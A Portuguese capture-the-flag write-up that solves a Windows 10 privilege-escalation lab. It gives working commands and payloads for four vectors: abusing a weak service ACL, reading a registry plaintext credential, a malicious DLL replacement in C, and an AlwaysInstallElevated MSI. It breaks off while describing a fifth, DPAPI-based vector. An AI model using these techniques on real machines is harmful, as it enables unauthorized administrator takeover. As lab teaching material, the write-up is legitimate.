# Writeup de Elevação de Privilégios no Windows 10 (5 vetores)

Solução completa do [desafio](README.md). A VM entrega a sessão do usuário comum
**`analista`** (grupo `BUILTIN\Usuários`, integridade média, só `SeChangeNotifyPrivilege`)
e esconde **cinco** falhas de configuração independentes que levam a administrador local /
`NT AUTHORITY\SYSTEM`.

>  **Spoiler.** Daqui pra frente tem solução. Tente sozinho antes.

Convenções deste writeup:

- Tudo é feito **de dentro da sessão de `analista`**, com **ferramentas nativas do Windows**
  (`cmd`, `powershell`, `sc`, `icacls`, `schtasks`, `reg`, `net`, `msiexec`). Onde algo precisa
  ser compilado, mostro como fazer **a partir de um Linux**, sem instalar nada na VM alvo.
- Antes de cada vetor: **restaure o snapshot `inicio`**. Cada caminho é independente.
- Três vetores dão **execução direta como SYSTEM sem descobrir senha** (W1, W3, W4). Neles a
  prova é objetiva: o código rodando como SYSTEM **adiciona o próprio `analista` ao grupo
  Administradores**. Os outros dois (W2, W5) **recuperam a senha** de uma conta administrativa.
- Nas saídas de recuperação de senha (W2 e W5) o valor aparece como `█████`
  **de propósito**, para você resolver no seu laboratório sem vazar a credencial da OVA pública.

## Reconhecimento inicial

Primeiro, saber quem somos e o que temos:

```powershell
whoami /all
```

```text
PS C:\Users\analista> whoami /all

INFORMAÇÕES DE USUÁRIO
-----------------------

Nome de usuário          SID
======================== ==============================================
desktop-jfoam3o\analista S-1-5-21-2528968778-2041621043-1631695474-1002


INFORMAÇÕES DE GRUPO
---------------------

Nome do grupo                              Tipo                     SID          Atributos                                 
========================================== ======================== ============ ====================================================
Todos                                      Grupo bastante conhecido S-1-1-0      Grupo obrigatório, Ativado por padrão, Grupo ativado
BUILTIN\Usuários                           Alias                    S-1-5-32-545 Grupo obrigatório, Ativado por padrão, Grupo ativado
AUTORIDADE NT\INTERATIVO                   Grupo bastante conhecido S-1-5-4      Grupo obrigatório, Ativado por padrão, Grupo ativado
LOGON de CONSOLE                           Grupo bastante conhecido S-1-2-1      Grupo obrigatório, Ativado por padrão, Grupo ativado
AUTORIDADE NT\Usuários autenticados        Grupo bastante conhecido S-1-5-11     Grupo obrigatório, Ativado por padrão, Grupo ativado
AUTORIDADE NT\Esta organização             Grupo bastante conhecido S-1-5-15     Grupo obrigatório, Ativado por padrão, Grupo ativado
AUTORIDADE NT\Conta local                  Grupo bastante conhecido S-1-5-113    Grupo obrigatório, Ativado por padrão, Grupo ativado
LOCAL                                      Grupo bastante conhecido S-1-2-0      Grupo obrigatório, Ativado por padrão, Grupo ativado
AUTORIDADE NT\Autenticação NTLM            Grupo bastante conhecido S-1-5-64-10  Grupo obrigatório, Ativado por padrão, Grupo ativado
Rótulo Obrigatório\Nível Obrigatório Médio Rótulo                   S-1-16-8192                                            


INFORMAÇÕES DE PRIVILÉGIOS
---------------------------

Nome de privilégio            Descrição                                 Estado
============================= ========================================= ==========
SeShutdownPrivilege           Desligar o sistema                        Desativado
SeChangeNotifyPrivilege       Ignorar a verificação completa            Ativada
SeUndockPrivilege             Remover o computador da base de encaixe   Desativado
SeIncreaseWorkingSetPrivilege Aumentar conjunto de trabalho de processo Desativado
SeTimeZonePrivilege           Alterar fuso horário                      Desativado

PS C:\Users\analista>
```

Confirma o ponto de partida: `analista` pertence só a `BUILTIN\Usuários` (SID `S-1-5-32-545`),
nível de integridade **Médio**, sem privilégios de abuso de token (`SeImpersonate`,
`SeDebug` etc.). A elevação terá que vir de **configuração insegura** (serviços, tarefas,
registro, permissões de arquivo), e não de abuso de privilégio do token.

O alvo de todos os vetores é a aplicação fictícia **Orion**, cujos artefatos ficam em
`C:\ProgramData\Orion`. Comece a enumeração por ali e pelos serviços/tarefas de terceiros.

---

## Vetor 1: Serviço `OrionMaintenance` com DACL fraca

**Problema.** Um serviço do Windows tem **duas** camadas de permissão independentes: a ACL do
**arquivo** `.exe` em disco e a ACL do **objeto de serviço** no Service Control Manager (SCM),
que diz quem pode reconfigurar, iniciar e parar o serviço. Aqui o `.exe` é somente leitura
para usuários comuns, mas a ACL do **objeto de serviço** concede a `BUILTIN\Usuários` o
direito de **alterar a configuração** (`SERVICE_CHANGE_CONFIG`). Como o serviço roda como
`LocalSystem`, basta apontar o `binPath` para um comando nosso e reiniciar: o SCM executa esse
comando como SYSTEM.

### Descoberta

Serviços fora de `C:\Windows` (candidatos de terceiros):

```powershell
Get-CimInstance Win32_Service |
  Where-Object { $_.PathName -notmatch 'C:\\Windows' } |
  Select-Object Name, State, StartName, PathName | Format-List
```

```text
PS C:\Users\analista> Get-CimInstance Win32_Service |
>>   Where-Object { $_.PathName -notmatch 'C:\\Windows' } |
>>   Select-Object Name, State, StartName, PathName | Format-List


Name      : edgeupdate
State     : Stopped
StartName : LocalSystem
PathName  : "C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe" /svc

Name      : edgeupdatem
State     : Stopped
StartName : LocalSystem
PathName  : "C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe" /medsvc

Name      : LSM
State     : Running
StartName :
PathName  :

Name      : MDCoreSvc
State     : Running
StartName : LocalSystem
PathName  : "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.26100.4-0\MpDefenderCoreService.exe"

Name      : MicrosoftEdgeElevationService
State     : Stopped
StartName : LocalSystem
PathName  : "C:\Program Files (x86)\Microsoft\Edge\Application\156.0.4314.58\elevation_service.exe"

Name      : NetSetupSvc
State     : Stopped
StartName :
PathName  :

Name      : OrionMaintenance
State     : Running
StartName : LocalSystem
PathName  : "C:\ProgramData\Orion\core\OrionMaintenance.exe"

Name      : Sense
State     : Stopped
StartName : LocalSystem
PathName  : "C:\Program Files\Windows Defender Advanced Threat Protection\MsSense.exe"

Name      : uhssvc
State     : Stopped
StartName : LocalSystem
PathName  : "C:\Program Files\Microsoft Update Health Tools\uhssvc.exe"

Name      : VGAuthService
State     : Running
StartName : LocalSystem
PathName  : "C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe"

Name      : VM3DService
State     : Running
StartName : LocalSystem
PathName  : "C:\Program Files\VMware\VMware Tools\vm3dservice.exe"

Name      : VMTools
State     : Running
StartName : LocalSystem
PathName  : "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"

Name      : WdNisSvc
State     : Running
StartName : NT AUTHORITY\LocalService
PathName  : "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.26100.4-0\NisSrv.exe"

Name      : WinDefend
State     : Running
StartName : LocalSystem
PathName  : "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.26100.4-0\MsMpEng.exe"

Name      : WMPNetworkSvc
State     : Stopped
StartName : NT AUTHORITY\NetworkService
PathName  : "C:\Program Files\Windows Media Player\wmpnetwk.exe"



PS C:\Users\analista>
```

Detalhe do serviço e a ACL do objeto (em SDDL):

```powershell
sc.exe qc OrionMaintenance
sc.exe sdshow OrionMaintenance
```

```text
PS C:\Users\analista> sc.exe qc OrionMaintenance
[SC] QueryServiceConfig ÊXITO

NOME_DO_SERVIÇO: OrionMaintenance
    TIPO                       : 10  WIN32_OWN_PROCESS
    TIPO_DE_INÍCIO             : 2   AUTO_START
    CONTROLE_DE_ERRO           : 1   NORMAL
    NOME_DO_CAMINHO_BINÁRIO    : "C:\ProgramData\Orion\core\OrionMaintenance.exe"
    GRUPO_DE_ORDEM_DE_CARREG.  :
    MARCA                      : 0
    NOME_PARA_EXIBIÇÃO         : OrionMaintenance
    DEPENDÊNCIAS               :
       NOME_DO_INÍCIO_DO_SERVIÇO  : LocalSystem

PS C:\Users\analista> sc.exe sdshow OrionMaintenance

D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;DCRPWP;;;BU)
```

A ACE que interessa na SDDL é **`(A;;DCRPWP;;;BU)`**:

- `A`: *Allow*
- `DC`: `SERVICE_CHANGE_CONFIG` (alterar a configuração, inclusive o `binPath`)
- `RP`: `SERVICE_START`
- `WP`: `SERVICE_STOP`
- `BU`: `BUILTIN\Users`, grupo do `analista`

Confirme que o **arquivo** não é gravável (por isso o ataque é no objeto de serviço, não no `.exe`):

```powershell
icacls "C:\ProgramData\Orion\core"
icacls "C:\ProgramData\Orion\core\OrionMaintenance.exe"
```

```text
PS C:\Users\analista> icacls "C:\ProgramData\Orion\core"
C:\ProgramData\Orion\core BUILTIN\Usuários:(OI)(CI)(RX)
                          BUILTIN\Administradores:(OI)(CI)(F)
                          AUTORIDADE NT\SISTEMA:(OI)(CI)(F)

Processados com sucesso 1 arquivos; falha no processamento de 0 arquivos
PS C:\Users\analista> icacls "C:\ProgramData\Orion\core\OrionMaintenance.exe"
C:\ProgramData\Orion\core\OrionMaintenance.exe BUILTIN\Usuários:(I)(RX)
                                               BUILTIN\Administradores:(I)(F)
                                               AUTORIDADE NT\SISTEMA:(I)(F)

Processados com sucesso 1 arquivos; falha no processamento de 0 arquivos
PS C:\Users\analista>
```

### Exploração

O serviço é `AUTO_START` e já está rodando; não basta reconfigurar, é preciso **parar e
iniciar** para o SCM reler o `binPath`. O payload adiciona `analista` aos Administradores:

```powershell
sc.exe stop OrionMaintenance
sc.exe config OrionMaintenance binPath= "cmd.exe /c net localgroup Administradores analista /add"
sc.exe start OrionMaintenance
```

```text
PS C:\Users\analista> sc.exe stop OrionMaintenance

NOME_DO_SERVIÇO: OrionMaintenance
    TIPO                       : 10  WIN32_OWN_PROCESS
    ESTADO                     : 3  STOP_PENDING
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
    CÓDIGO_DE_SAÍDA_DO_WIN32   : 0  (0x0)
    CÓDIGO_DE_SAÍDA_DO_SERVIÇO : 0  (0x0)
    PONTO_DE_VERIFICAÇÃO       : 0x0
    AGUARDAR_DICA              : 0x0
PS C:\Users\analista> sc.exe config OrionMaintenance binPath= "cmd.exe /c net localgroup Administradores analista /add"
[SC] ChangeServiceConfig ÊXITO
PS C:\Users\analista> sc.exe start OrionMaintenance
[SC] StartService FALHA 1053:

O serviço não respondeu à requisição de início ou controle em tempo hábil.

PS C:\Users\analista>
```

> **O `start` retorna erro `1053`, e está tudo certo.** `cmd.exe` não implementa a interface
> do SCM, então o Service Control Manager reclama que o serviço "não respondeu a tempo". Mas o
> `net localgroup ...` **já executou como SYSTEM** antes do `cmd` encerrar. O erro é do
> protocolo de serviço, não da sua ação.

### Evidência

```powershell
net localgroup Administradores
```

```text
PS C:\Users\analista> net localgroup Administradores
Nome de alias      Administradores
Comentário         Os administradores têm acesso completo e irrestrito ao computador/domínio

Membros

-------------------------------------------------------------------------------
admin2
Administrador
analista
orionadmin
Comando concluído com êxito.

PS C:\Users\analista>
```

`analista` agora consta em **Administradores**. Depois de deslogar e logar de novo, o token
de `analista` já carrega o grupo Administradores (integridade alta ao elevar).

**Referência:** [Service security and access rights (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights)

---

## Vetor 2: Credencial em texto claro no Registro

**Problema.** A conta administrativa `admin2` guarda a senha **em texto claro** numa chave
HKLM legível por usuários comuns, com uma pista deixada num `.ini`. Não há exploração de
mecanismo do SO: a própria credencial exposta dá a identidade administrativa.

### Descoberta

Enumere os artefatos da Orion e leia a pista:

```powershell
Get-ChildItem -Recurse C:\ProgramData\Orion -ErrorAction SilentlyContinue | Select-Object FullName
cmd /c type "C:\ProgramData\Orion\config\support-client.ini"
```

```text
PS C:\Users\analista> Get-ChildItem -Recurse C:\ProgramData\Orion -ErrorAction SilentlyContinue |
>>   Select-Object FullName

FullName
--------
C:\ProgramData\Orion\Backup
C:\ProgramData\Orion\config
C:\ProgramData\Orion\core
C:\ProgramData\Orion\logs
C:\ProgramData\Orion\vault
C:\ProgramData\Orion\.installed
C:\ProgramData\Orion\Backup\agent.log
C:\ProgramData\Orion\Backup\credentials.bin
C:\ProgramData\Orion\Backup\settings.json
C:\ProgramData\Orion\config\support-client.ini
C:\ProgramData\Orion\core\dll_check.exe
C:\ProgramData\Orion\core\OrionMaintenance.exe
C:\ProgramData\Orion\core\OrionTelemetry.dll

PS C:\Users\analista> cmd /c type "C:\ProgramData\Orion\config\support-client.ini"
[LegacySupport]
credential_key=HKLM\SOFTWARE\Orion\LegacySupport
```

O `.ini` aponta `credential_key=HKLM\SOFTWARE\Orion\LegacySupport`. Consulte a chave:

```powershell
reg query "HKLM\SOFTWARE\Orion\LegacySupport"
```

```text
PS C:\Users\analista> reg query "HKLM\SOFTWARE\Orion\LegacySupport"

HKEY_LOCAL_MACHINE\SOFTWARE\Orion\LegacySupport
    Account    REG_SZ    admin2
    Password    REG_SZ    █████
```

A chave traz `Account = admin2` e `Password` **em texto claro**. (Confirme a ACL frouxa com
`(Get-Acl HKLM:\SOFTWARE\Orion\LegacySupport).Access`: `Usuários` tem leitura.)

### Exploração

Autentique como `admin2` usando só o PowerShell nativo (sem expor a senha na linha de comando):

```powershell
$sec  = Read-Host "Senha do admin2" -AsSecureString
$cred = New-Object System.Management.Automation.PSCredential('admin2', $sec)
Start-Process cmd.exe -Credential $cred
```

> Alternativa pela GUI: *Shift + botão direito* em `cmd.exe` → **Executar como outro usuário**
> → `admin2` + a senha recuperada.

### Evidência

Na janela aberta no contexto de `admin2`:

```cmd
whoami
whoami /groups
```

```text
PS C:\Users\analista> $sec = Read-Host "Senha do admin2" -AsSecureString
Senha do admin2: *******************************
PS C:\Users\analista> $cred = New-Object System.Management.Automation.PSCredential('admin2', $sec)
PS C:\Users\analista> Start-Process cmd.exe -Credential $cred

C:\Windows\system32>whoami
desktop-jfoam3o\admin2

C:\Windows\system32>whoami /groups

INFORMAÇÕES DE GRUPO
---------------------

Nome do grupo                                                  Tipo                     SID          Atributos          
============================================================== ======================== ============ ===========================================================================
Todos                                                          Grupo bastante conhecido S-1-1-0      Grupo obrigatório, Ativado por padrão, Grupo ativado
AUTORIDADE NT\Conta local e membro do grupo de Administradores Grupo bastante conhecido S-1-5-114    Grupo obrigatório, Ativado por padrão, Grupo ativado
BUILTIN\Administradores                                        Alias                    S-1-5-32-544 Grupo obrigatório, Ativado por padrão, Grupo ativado, Proprietário do grupo
BUILTIN\Usuários                                               Alias                    S-1-5-32-545 Grupo obrigatório, Ativado por padrão, Grupo ativado
AUTORIDADE NT\INTERATIVO                                       Grupo bastante conhecido S-1-5-4      Grupo obrigatório, Ativado por padrão, Grupo ativado
LOGON de CONSOLE                                               Grupo bastante conhecido S-1-2-1      Grupo obrigatório, Ativado por padrão, Grupo ativado
AUTORIDADE NT\Usuários autenticados                            Grupo bastante conhecido S-1-5-11     Grupo obrigatório, Ativado por padrão, Grupo ativado
AUTORIDADE NT\Esta organização                                 Grupo bastante conhecido S-1-5-15     Grupo obrigatório, Ativado por padrão, Grupo ativado
AUTORIDADE NT\Conta local                                      Grupo bastante conhecido S-1-5-113    Grupo obrigatório, Ativado por padrão, Grupo ativado
LOCAL                                                          Grupo bastante conhecido S-1-2-0      Grupo obrigatório, Ativado por padrão, Grupo ativado
AUTORIDADE NT\Autenticação NTLM                                Grupo bastante conhecido S-1-5-64-10  Grupo obrigatório, Ativado por padrão, Grupo ativado
Rótulo Obrigatório\Nível Obrigatório Alto                      Rótulo                   S-1-16-12288                    

C:\Windows\system32>
```

`whoami` retorna `...\admin2`, membro de `BUILTIN\Administradores`.

**Referência:** [MITRE ATT&CK T1552.002: Credentials in Registry](https://attack.mitre.org/techniques/T1552/002/)

---

## Vetor 3: Substituição de DLL em tarefa agendada SYSTEM

**Problema.** A tarefa `\Orion\DllCheck` roda `dll_check.exe` **como SYSTEM** a cada 2 minutos
(e pode ser disparada pelo `analista`). Esse `.exe` carrega `OrionTelemetry.dll` **pelo nome**,
a partir da própria pasta. A pasta e o `.exe` são só leitura, **mas a DLL tem permissão de
modificação para Usuários**. Como o arquivo já existe e é gravável, trata-se de **substituição
de DLL** (sobrescrever os bytes), não de DLL ausente / ordem de busca. Nossa DLL roda dentro de
um processo SYSTEM.

### Descoberta

A tarefa, seu contexto e a DLL gravável:

```powershell
schtasks /query /tn "\Orion\DllCheck" /v /fo list
icacls "C:\ProgramData\Orion\core\OrionTelemetry.dll"
icacls "C:\ProgramData\Orion\core\dll_check.exe"
```

```text
PS C:\Users\analista> schtasks /query /tn "\Orion\DllCheck" /v /fo list

Pasta: \Orion
Nome do host:                                            DESKTOP-JFOAM3O
Nome da tarefa:                                          \Orion\DllCheck
Hora da próxima execução:                                05/11/2026 10:26:00
Status:                                                  Pronto
Modo de Logon:                                           Interativo/segundo plano
Horário da última execução:                              05/11/2026 10:24:00
Último resultado:                                        0
Autor:                                                   DESKTOP-JFOAM3O\pacific
Tarefa a ser executada:                                  C:\ProgramData\Orion\core\dll_check.exe
Iniciar em:                                              N/A
Comentário:                                              N/A
Estado de tarefa agendada:                               Habilitado
Tempo Ocioso:                                            Desativado
Gerenciamento de Energia:                                Parar se estiver usando baterias, Não iniciar se estiver usando baterias
Executar como Usuário:                                   SISTEMA
Excluir tarefa se não for reagendada:                    Desativado
Interromper tarefa se for executada X horas e X minutos: 72:00:00
Agendar:                                                 O agendamento de dados não está disponível neste formato.
Tipo de Agendamento:                                     Somente uma vez, Minuto
Hora de início:                                          07:18:00
Data de início:                                          15/10/2026
Data de término:                                         N/A
Dias:                                                    N/A
Meses:                                                   N/A
Repetir: a cada:                                         0 hora(s), 2 minuto(s)
Repetir: até: horário:                                   Nenhum
Repetir: até: duração:                                   Desativado
Repetir: parar se ainda estiver em execução:             Desativado
PS C:\Users\analista>

PS C:\Users\analista> icacls "C:\ProgramData\Orion\core\OrionTelemetry.dll"
C:\ProgramData\Orion\core\OrionTelemetry.dll BUILTIN\Usuários:(M)
                                             BUILTIN\Administradores:(F)
                                             AUTORIDADE NT\SISTEMA:(F)

Processados com sucesso 1 arquivos; falha no processamento de 0 arquivos

PS C:\Users\analista> icacls "C:\ProgramData\Orion\core\dll_check.exe"
C:\ProgramData\Orion\core\dll_check.exe BUILTIN\Usuários:(I)(RX)
                                        BUILTIN\Administradores:(I)(F)
                                        AUTORIDADE NT\SISTEMA:(I)(F)

Processados com sucesso 1 arquivos; falha no processamento de 0 arquivos
PS C:\Users\analista>
```

A tarefa mostra **Executar como: SYSTEM**, a cada 2 min; a DLL mostra `BUILTIN\Usuários:(M)`
(Modify) enquanto o `.exe` e a pasta são só `(RX)`.

**Confirmando que o `.exe` depende dessa DLL, com PowerShell nativo.** Como `dll_check.exe` é
um assembly .NET, os literais de string ficam em **UTF-16**; uma varredura de strings pelo
próprio PowerShell revela o nome da DLL e do export chamado:

```powershell
$b = [IO.File]::ReadAllBytes('C:\ProgramData\Orion\core\dll_check.exe')
# strings ASCII
[Text.Encoding]::ASCII.GetString($b)   -split '[^\x20-\x7E]+' |
  Where-Object { $_ -match 'Orion|kernel32|LoadLibrary|GetProc' } | Sort-Object -Unique
# strings UTF-16 (onde ficam os literais do .NET)
[Text.Encoding]::Unicode.GetString($b) -split '[^\x20-\x7E]+' |
  Where-Object { $_ -match 'Orion|LoadLibrary|GetProc' } | Sort-Object -Unique
```

```text
PS C:\Users\analista> $b = [IO.File]::ReadAllBytes('C:\ProgramData\Orion\core\dll_check.exe')
PS C:\Users\analista> ([Text.Encoding]::ASCII.GetString($b)   -split '[^\x20-\x7E]+' | Where-Object { $_ -match 'Orion|kernel32|LoadLibrary' }) | Sort-Object -Unique
kernel32.dll
LoadLibrary
PS C:\Users\analista> ([Text.Encoding]::Unicode.GetString($b) -split '[^\x20-\x7E]+' | Where-Object { $_ -match 'Orion|LoadLibrary|GetProc' }) | Sort-Object -Unique
OrionTelemetry.dll
OrionTelemetryCheck
PS C:\Users\analista>
```

Aparecem `OrionTelemetry.dll`, `OrionTelemetryCheck`, `LoadLibrary`/`GetProcAddress`: o
binário carrega a DLL por nome e chama o export `OrionTelemetryCheck`. É esse export que a
nossa DLL precisa implementar.

### Exploração

**Compilar a DLL a partir do Linux (MinGW).** Nossa DLL exporta `OrionTelemetryCheck` (cdecl,
retorna `int`) com a mesma assinatura esperada, e no caminho executa o payload. Arquivo
`orion_payload.c`:

```c
#include <windows.h>
#include <stdlib.h>

// export que o dll_check.exe procura:
__declspec(dllexport) int __cdecl OrionTelemetryCheck(void) {
    system("net localgroup Administradores analista /add");
    return 1;  // mantém o contrato original (sucesso)
}

// roda também só de carregar a DLL (LoadLibrary dispara DllMain):
BOOL WINAPI DllMain(HINSTANCE h, DWORD reason, LPVOID r) {
    (void)h; (void)r;
    if (reason == DLL_PROCESS_ATTACH)
        system("net localgroup Administradores analista /add");
    return TRUE;
}
```

Compilação (x64, para casar com o `.exe`):

```bash
sudo apt install gcc-mingw-w64-x86-64
x86_64-w64-mingw32-gcc -shared -O2 -o OrionTelemetry.dll orion_payload.c
```

```text
$ x86_64-w64-mingw32-gcc -shared -O2 -o OrionTelemetry.dll orion_payload.c
# (compilação sem mensagens, OrionTelemetry.dll gerada)
```

Traga `OrionTelemetry.dll` para a VM, em `C:\temp` (crie a pasta se não existir). **Sobrescreva os bytes** da DLL existente
(a pasta não é gravável, mas o arquivo é) e **dispare** a tarefa:

```powershell
[IO.File]::WriteAllBytes('C:\ProgramData\Orion\core\OrionTelemetry.dll', [IO.File]::ReadAllBytes('C:\temp\OrionTelemetry.dll'))
schtasks /run /tn "\Orion\DllCheck"
Start-Sleep -Seconds 10
```

```text
PS C:\Users\analista> [IO.File]::WriteAllBytes('C:\ProgramData\Orion\core\OrionTelemetry.dll', [IO.File]::ReadAllBytes('C:\temp\OrionTelemetry.dll'))
PS C:\Users\analista> schtasks /run /tn "\Orion\DllCheck"
ÊXITO: tentativa de executar a tarefa agendada "\Orion\DllCheck".
PS C:\Users\analista> Start-Sleep -Seconds 10
```

> Se o `schtasks /run` manual falhar por permissão, espere até 2 minutos: o agendamento
> automático roda a tarefa como SYSTEM do mesmo jeito.

### Evidência

```powershell
net localgroup Administradores
```

```text
PS C:\Users\analista> net localgroup Administradores
Nome de alias      Administradores
Comentário         Os administradores têm acesso completo e irrestrito ao computador/domínio

Membros

-------------------------------------------------------------------------------
admin2
Administrador
analista
orionadmin
Comando concluído com êxito.

PS C:\Users\analista>
```

**Referência:** [Dynamic-Link Library Search Order (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order) · [MITRE ATT&CK T1574.001: DLL](https://attack.mitre.org/techniques/T1574/001/)

---

## Vetor 4: `AlwaysInstallElevated`

**Problema.** A política `AlwaysInstallElevated` faz o Windows Installer instalar qualquer
pacote `.msi` **como SYSTEM**. Ela só tem efeito quando está ligada **tanto em HKLM quanto em
HKCU**. Na VM, o HKLM já vem com `AlwaysInstallElevated=1`; o HKCU está vazio. Como o HKCU é a
*nossa* colmeia (o `analista` pode escrever nela), basta completar a política e instalar um MSI
que faça o que quisermos, com privilégio de SYSTEM.

### Descoberta

```powershell
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer" /v AlwaysInstallElevated
reg query "HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer" /v AlwaysInstallElevated
```

```text
PS C:\Users\analista> reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer" /v AlwaysInstallElevated

HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1

PS C:\Users\analista> reg query "HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer" /v AlwaysInstallElevated

ERRO: O sistema não pôde localizar a chave do Registro ou valor especificado.
```

HKLM = `0x1`; HKCU ausente. Falta o lado do usuário.

### Exploração

**Construir o MSI a partir do Linux (wixl / msitools).** O pacote roda uma *custom action*
diferida, sem personificação (`Impersonate="no"`), que o Installer executa como SYSTEM. O `wixl`
é uma reimplementação enxuta do WiX e **não aceita** `Directory` numa `CustomAction` nem `Platform`
no `<Package>`; para rodar um comando usa-se o par de ações que o próprio `wixl` usa internamente:
uma `SetProperty` que aponta uma propriedade para `[SystemFolder]cmd.exe` e uma `CustomAction` do
tipo *exe-from-property* (`Property` + `ExeCommand`). Arquivo `orion.wxs`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
  <Product Id="*" Name="Orion Update" Language="1033" Version="1.0.0"
           Manufacturer="Orion" UpgradeCode="800E3695-9B1F-4018-B027-C098A7350E6E">
    <Package InstallerVersion="200" Compressed="yes" InstallScope="perMachine" Comments="Orion Update" />
    <Media Id="1" Cabinet="product.cab" EmbedCab="yes" />
    <Directory Id="TARGETDIR" Name="SourceDir">
      <Directory Id="ProgramFilesFolder">
        <Directory Id="ORIONDIR" Name="OrionUpdate">
          <Component Id="Marker" Guid="*">
            <RegistryValue Root="HKLM" Key="Software\Orion\Update"
                           Name="Installed" Type="string" Value="1" KeyPath="yes" />
          </Component>
        </Directory>
      </Directory>
    </Directory>
    <Feature Id="Main" Level="1">
      <ComponentRef Id="Marker" />
    </Feature>
    <!-- 1) aponta a propriedade para o cmd.exe real (tipo 51, imediata) -->
    <CustomAction Id="SetCmd" Property="ORIONCMD" Value="[SystemFolder]cmd.exe" />
    <!-- 2) roda o comando como SYSTEM na instalação elevada (tipo 50 + diferida + sem impersonar) -->
    <CustomAction Id="AddAdmin" Property="ORIONCMD"
                  ExeCommand="/c net localgroup Administradores analista /add"
                  Execute="deferred" Impersonate="no" Return="ignore" />
    <InstallExecuteSequence>
      <Custom Action="SetCmd" After="CostFinalize">1</Custom>
      <Custom Action="AddAdmin" After="InstallFiles">1</Custom>
    </InstallExecuteSequence>
  </Product>
</Wix>
```

Compilação (em distros atuais o `wixl` é um pacote separado do `msitools`):

```bash
sudo apt install wixl msitools
wixl -v -o orion.msi orion.wxs
```

**Confira antes de levar para a VM** que a *custom action* entrou no MSI; ele deve listar `SetCmd`
(tipo 51) e `AddAdmin` (tipo 3122 = 50 + diferida + sem impersonar + ignora erro):

```bash
msiinfo export orion.msi CustomAction
```

```text
$ wixl -v -o orion.msi orion.wxs
Loading orion.wxs...
Building orion.msi...
Writing orion.msi...
$ msiinfo export orion.msi CustomAction
SetCmd	51	ORIONCMD	[SystemFolder]cmd.exe
AddAdmin	3122	ORIONCMD	/c net localgroup Administradores analista /add
```

Traga `orion.msi` para a VM, em `C:\temp` (crie a pasta se não existir). Complete a política em HKCU e instale em silêncio:

```powershell
reg add "HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer" /v AlwaysInstallElevated /t REG_DWORD /d 1 /f
$log = Join-Path $env:TEMP 'orion-w4.log'
$p = Start-Process msiexec.exe -ArgumentList "/i `"C:\temp\orion.msi`" /qn /norestart /L*v `"$log`"" -Wait -PassThru
$p.ExitCode
```

```text
PS C:\Users\analista> reg add "HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer" /v AlwaysInstallElevated /t REG_DWORD /d 1 /f
A operação foi concluída com êxito.

PS C:\Users\analista> $log = Join-Path $env:TEMP 'orion-w4.log'
PS C:\Users\analista> $p = Start-Process msiexec.exe -ArgumentList "/i `"C:\temp\orion.msi`" /qn /norestart /L*v `"$log`"" -Wait -PassThru
PS C:\Users\analista> $p.ExitCode
0
```

`ExitCode` **0** = instalação concluída (e a custom action rodou como SYSTEM). Se vier `1619`,
o caminho/arquivo do MSI está errado; `1603`, leia o `$log`.

### Evidência

```powershell
net localgroup Administradores
```

```text
PS C:\Users\analista> net localgroup Administradores
Nome de alias      Administradores
Comentário         Os administradores têm acesso completo e irrestrito ao computador/domínio

Membros

-------------------------------------------------------------------------------
admin2
Administrador
analista
orionadmin
Comando concluído com êxito.

PS C:\Users\analista>
```

**Referência:** [AlwaysInstallElevated (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/msi/alwaysinstallelevated) · [MITRE ATT&CK T1548.002](https://attack.mitre.org/techniques/T1548/002/)

---

## Vetor 5: Credencial protegida por DPAPI (escopo de máquina)

**Problema.** A conta administrativa `orionadmin` tem a senha guardada num blob **DPAPI**, só
que com escopo **`LocalMachine`**. Nesse escopo, **qualquer usuário local** consegue decifrar o
blob (a chave é da máquina, não do usuário), desde que tenha o arquivo e a *entropia*. E as
pistas estão todas legíveis: o arquivo do blob, a conta e o registro que guarda a entropia.

### Descoberta

```powershell
Get-ChildItem C:\ProgramData\Orion\Backup
cmd /c type "C:\ProgramData\Orion\Backup\settings.json"
cmd /c type "C:\ProgramData\Orion\Backup\agent.log"
reg query "HKLM\SOFTWARE\Orion\BackupAgent" /v Seed
```

```text
PS C:\Users\analista> Get-ChildItem C:\ProgramData\Orion\Backup


    Diretório: C:\ProgramData\Orion\Backup


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        15/10/2026     07:18             89 agent.log
-a----        15/10/2026     07:18            246 credentials.bin
-a----        15/10/2026     07:18            152 settings.json

PS C:\Users\analista> cmd /c type "C:\ProgramData\Orion\Backup\settings.json"
´╗┐{
    "account":  "orionadmin",
    "credential_store":  "credentials.bin",
    "entropy_registry":  "HKLM\\SOFTWARE\\Orion\\BackupAgent\\Seed"
}

PS C:\Users\analista> cmd /c type "C:\ProgramData\Orion\Backup\agent.log"
´╗┐Orion Backup: credential store loaded using Windows Data Protection (machine scope).

PS C:\Users\analista> reg query "HKLM\SOFTWARE\Orion\BackupAgent" /v Seed

HKEY_LOCAL_MACHINE\SOFTWARE\Orion\BackupAgent
    Seed    REG_SZ    99ee7691e13c40558814b79472ab5811

PS C:\Users\analista>
```

`settings.json` dá a conta (`orionadmin`), o arquivo (`credentials.bin`) e o registro da
entropia (`...\BackupAgent\Seed`). O `agent.log` entrega a dica **"Windows Data Protection
